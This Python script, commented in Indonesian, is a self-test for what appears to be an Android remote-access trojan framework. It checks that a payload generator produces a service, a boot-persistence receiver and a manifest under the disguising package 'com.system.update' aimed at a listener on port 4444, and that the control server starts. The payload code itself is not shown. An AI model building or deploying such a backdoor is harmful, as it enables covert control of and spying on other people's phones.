#!/usr/bin/env python3
"""
Android Module Validator
Quick test untuk memastikan semua komponen siap
"""

import os
import sys
import socket
from termcolor import colored

def print_header(text):
    print(colored("\n" + "="*60, 'cyan'))
    print(colored(f"  {text}", 'white', attrs=['bold']))
    print(colored("="*60, 'cyan'))

def check_file(filepath, expected_size_min=0):
    """Check if file exists and has content"""
    if os.path.exists(filepath):
        size = os.path.getsize(filepath)
        if size > expected_size_min:
            print(colored(f"  ✓ {os.path.basename(filepath):30} ({size:6} bytes)", 'green'))
            return True
        else:
            print(colored(f"  ✗ {os.path.basename(filepath):30} (too small: {size} bytes)", 'red'))
            return False
    else:
        print(colored(f"  ✗ {os.path.basename(filepath):30} MISSING", 'red'))
        return False

def test_imports():
    """Test if all required modules can be imported"""
    print_header("TESTING IMPORTS")
    
    all_ok = True
    
    try:
        from modules.android_access import AndroidRemoteAccess
        print(colored("  ✓ AndroidRemoteAccess import OK", 'green'))
    except Exception as e:
        print(colored(f"  ✗ AndroidRemoteAccess import FAILED: {e}", 'red'))
        all_ok = False
    
    try:
        from core.android_helper import AndroidHelper
        print(colored("  ✓ AndroidHelper import OK", 'green'))
    except Exception as e:
        print(colored(f"  ✗ AndroidHelper import FAILED: {e}", 'red'))
        all_ok = False
    
    try:
        from utils.logger import setup_logger
        print(colored("  ✓ Logger import OK", 'green'))
    except Exception as e:
        print(colored(f"  ✗ Logger import FAILED: {e}", 'red'))
        all_ok = False
    
    return all_ok

def test_payload_generation():
    """Test payload generation"""
    print_header("TESTING PAYLOAD GENERATION")
    
    try:
        sys.path.insert(0, '.')
        from core.android_helper import AndroidHelper
        
        helper = AndroidHelper()
        payload = helper.generate_apk_payload_code("192.168.1.100", 4444)
        
        required_files = ['MainActivity.java', 'RemoteService.java', 'BootReceiver.java', 
                         'AndroidManifest.xml', 'build.gradle']
        
        all_ok = True
        for file in required_files:
            if file in payload:
                size = len(payload[file])
                if size > 100:
                    print(colored(f"  ✓ {file:30} ({size:6} chars)", 'green'))
                else:
                    print(colored(f"  ✗ {file:30} (too small)", 'red'))
                    all_ok = False
            else:
                print(colored(f"  ✗ {file:30} MISSING", 'red'))
                all_ok = False
        
        return all_ok
        
    except Exception as e:
        print(colored(f"  ✗ Payload generation FAILED: {e}", 'red'))
        return False

def test_payload_files():
    """Test if android_payload files exist"""
    print_header("CHECKING ANDROID PAYLOAD FILES")
    
    payload_dir = "android_payload"
    required_files = {
        "MainActivity.java": 1000,
        "RemoteService.java": 10000,
        "BootReceiver.java": 500,
        "AndroidManifest.xml": 2000,
        "build.gradle": 500,
        "BUILD_INSTRUCTIONS.txt": 2000
    }
    
    all_ok = True
    for file, min_size in required_files.items():
        path = os.path.join(payload_dir, file)
        if not check_file(path, min_size):
            all_ok = False
    
    return all_ok

def test_network():
    """Test network configuration"""
    print_header("TESTING NETWORK")
    
    try:
        # Get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        print(colored(f"  ✓ Local IP: {local_ip}", 'green'))
        
        # Check if ports are available
        test_ports = [4444, 8080]
        for port in test_ports:
            try:
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_socket.bind(('0.0.0.0', port))
                test_socket.close()
                print(colored(f"  ✓ Port {port} available", 'green'))
            except:
                print(colored(f"  ⚠ Port {port} might be in use (not critical)", 'yellow'))
        
        return True
        
    except Exception as e:
        print(colored(f"  ✗ Network test FAILED: {e}", 'red'))
        return False

def test_server_instance():
    """Test if AndroidRemoteAccess can be instantiated"""
    print_header("TESTING SERVER INSTANCE")
    
    try:
        sys.path.insert(0, '.')
        from modules.android_access import AndroidRemoteAccess
        
        module = AndroidRemoteAccess()
        print(colored(f"  ✓ Module instance created", 'green'))
        print(colored(f"  ✓ Server IP: {module.server_ip}", 'green'))
        print(colored(f"  ✓ Control Port: {module.server_port}", 'green'))
        print(colored(f"  ✓ HTTP Port: {module.http_port}", 'green'))
        
        return True
        
    except Exception as e:
        print(colored(f"  ✗ Server instance FAILED: {e}", 'red'))
        import traceback
        traceback.print_exc()
        return False

def check_java_syntax():
    """Basic check for Java files syntax"""
    print_header("CHECKING JAVA FILES SYNTAX")
    
    java_files = [
        "android_payload/MainActivity.java",
        "android_payload/RemoteService.java",
        "android_payload/BootReceiver.java"
    ]
    
    all_ok = True
    for file in java_files:
        if os.path.exists(file):
            with open(file, 'r') as f:
                content = f.read()
                
                # Basic checks
                checks = [
                    ('package com.system.update;', 'Package declaration'),
                    ('class ' in content or 'public class' in content, 'Class declaration'),
                    (content.count('{') == content.count('}'), 'Balanced braces')
                ]
                
                file_ok = True
                for check, desc in checks:
                    if isinstance(check, bool):
                        result = check
                    else:
                        result = check in content
                    
                    if result:
                        print(colored(f"  ✓ {os.path.basename(file):25} - {desc}", 'green'))
                    else:
                        print(colored(f"  ✗ {os.path.basename(file):25} - {desc} FAILED", 'red'))
                        file_ok = False
                
                if not file_ok:
                    all_ok = False
        else:
            print(colored(f"  ✗ {os.path.basename(file)} NOT FOUND", 'red'))
            all_ok = False
    
    return all_ok

def main():
    print(colored("\n╔════════════════════════════════════════════════════════════╗", 'magenta'))
    print(colored("║      ANDROID MODULE VALIDATION TEST                        ║", 'magenta', attrs=['bold']))
    print(colored("╚════════════════════════════════════════════════════════════╝", 'magenta'))
    
    results = {
        "Imports": test_imports(),
        "Payload Generation": test_payload_generation(),
        "Payload Files": test_payload_files(),
        "Java Syntax": check_java_syntax(),
        "Network": test_network(),
        "Server Instance": test_server_instance()
    }
    
    # Summary
    print_header("TEST SUMMARY")
    
    all_passed = True
    for test, result in results.items():
        status = colored("✓ PASSED", 'green') if result else colored("✗ FAILED", 'red')
        print(f"  {test:25} {status}")
        if not result:
            all_passed = False
    
    print(colored("\n" + "="*60, 'cyan'))
    
    if all_passed:
        print(colored("\n✅ ALL TESTS PASSED!", 'green', attrs=['bold']))
        print(colored("   Module siap untuk digunakan!", 'green'))
        print(colored("\n📖 Lihat ANDROID_TESTING_GUIDE.md untuk cara penggunaan\n", 'cyan'))
        return 0
    else:
        print(colored("\n❌ SOME TESTS FAILED!", 'red', attrs=['bold']))
        print(colored("   Perbaiki error di atas sebelum menggunakan module\n", 'yellow'))
        return 1

if __name__ == "__main__":
    sys.exit(main())
